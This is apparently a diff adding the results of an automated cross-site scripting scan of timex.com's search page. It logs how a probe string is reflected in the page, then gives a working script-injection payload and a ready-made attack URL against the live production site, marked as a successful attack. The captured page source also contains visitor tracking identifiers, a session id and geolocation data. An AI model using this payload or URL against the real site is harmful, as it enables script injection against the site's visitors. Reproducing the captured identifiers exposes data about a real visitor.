@@ -1,0 +1,125 @@
+https://www.timex.com
+
+GET Params:[2]
+['q', 'lang']
+_______________________________________________________________________________________________________
+https://www.timex.com/search?q=(uvw"xyz'yxz</zxy&lang=en_US
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [1]
+<span class="no-hits-search-term">
+&#40;uvw&quot;xyz&#39;yxz&lt;/zxy
+</span>
+
+----------------------------------------------------------------------------------
+Script Context: [2]
+<script id="hiconversion_head_dw" type="text/javascript">
+	var __hic = __hic || {};
+	(function() {
+		try {
+			
+			__hic.data = JSON.parse(decodeURIComponent('%7B%22geo%22%3A%7B%22city%22%3A%22Lahore%22%2C%22countryCode%22%3A%22PK%22%2C%22lat%22%3A31.4888%2C%22lon%22%3A74.3686%2C%22metroCode%22%3A%220%22%2C%22postalCode%22%3A%2254000%22%2C%22regionCode%22%3A%22PB%22%2C%22regionName%22%3A%22Punjab%22%7D%2C%22user%22%3A%7B%22id%22%3A%22abqgdPVCDcCNbVXHjdlIjIiJ1f%22%2C%22auth%22%3Afalse%2C%22aov%22%3Anull%2C%22lod%22%3Anull%2C%22ocnt%22%3Anull%2C%22ov%22%3Anull%2C%22vmo%22%3Anull%2C%22vyr%22%3Anull%2C%22cg%22%3A%5B%22Everyone%22%2C%22NonArchive_Customer%22%2C%22Unregistered%22%5D%2C%22nv%22%3Atrue%2C%22sid%22%3A%228k8-0i6ksDCL3JaHt7ZPJZ7cO_vIfwVU-ZU%3D%22%7D%2C%22cart%22%3A%7B%22tt%22%3A0%2C%22st%22%3A0%2C%22qt%22%3A0%2C%22sh%22%3A0%2C%22sd%22%3A0%2C%22tx%22%3A0%2C%22ds%22%3A0%2C%22lds%22%3A0%2C%22li%22%3A%5B%5D%7D%2C%22page%22%3A%7B%22pl%22%3A%22Search-Show%22%2C%22cname%22%3A%22%22%2C%22cstep%22%3A%22%22%2C%22ord%22%3A1%2C%22cat%22%3A%22%22%2C%22q%22%3A%22(uvw%5C%22xyz\'yxz%3C%2Fzxy%22%7D%2C%22ab%22%3A%7B%22tname%22%3A%22%22%2C%22sgmnt%22%3A%22%22%7D%2C%22env%22%3A%22prod%22%2C%22version%22%3A%221.0%22%2C%22platform%22%3A%22demandware%22%2C%22pid%22%3A%22myGKT85D%22%7D'));
+			__hic.version = '16.1.0';
+			__hic.hicTagLocation = '//h30-deploy.hiconversion.com/origin/tag/';
+			
+		
+			if ('null' != 'null' &&
+				'null'.length > 0) {
+				__hic.hicTagLocation = 'null';
+			} else if ('myGKT85D' != 'null' &&
+				'myGKT85D'.length > 0) {
+				__hic.hicTagLocation += 'myGKT85D';
+			}
+		
+			var s = document.createElement('script');
+			s.id = "hiconversion_30";
+			s.async = "async";
+			s.type = "text/javascript";
+			s.src = __hic.hicTagLocation;
+			var nodes = document.getElementsByTagName("script");
+			if (nodes.length > 0) {
+			 	nodes[0].parentNode.insertBefore(s, nodes[0]);
+			}
+		} catch (e) {
+		
+		}
+	})();
+</script>
+<script type="text/javascript">
+var utag_data = {
+  "page_name": "Sites-timexus-Site",
+  "page_type": "search",
+  "page_context_type": "search",
+  "page_context_title": "product search results no hits",
+  "user_anonymous": "true",
+  "user_authenticated": "false",
+  "user_registered": "false",
+  "customer_id": "abqgdPVCDcCNbVXHjdlIjIiJ1f",
+  "search_results": "0",
+  "search_term": "(uvw\"xyz'yxz</zxy",
+  "locale": "en_US"
+};
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	False	False
+
+Attack Payloads for SCRIPT
+['</script><script>alert(1)</script>']
+
+SCRIPT Attack Url: https://www.timex.com/search?q=</script><script>alert(1)</script>&lang=en_US
+
+=> ATTACK SUCCESSFUL with Payload: </script><script>alert(1)</script>
+Detection of Payload: 
+<script type="text/javascript">
+var utag_data = {
+  "page_name": "Sites-timexus-Site",
+  "page_type": "search",
+  "page_context_type": "search",
+  "page_context_title": "product search results no hits",
+  "user_anonymous": "true",
+  "user_authenticated": "false",
+  "user_registered": "false",
+  "customer_id": "bfbUZzgDv1wLdPprB8UBKaXcbP",
+  "search_results": "0",
+  "search_term": "</script><script>alert(1)</script>",
+  "locale": "en_US"
+};
+</script>
+_______________________________________________________________________________________________________
+https://www.timex.com/search?q=&lang=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
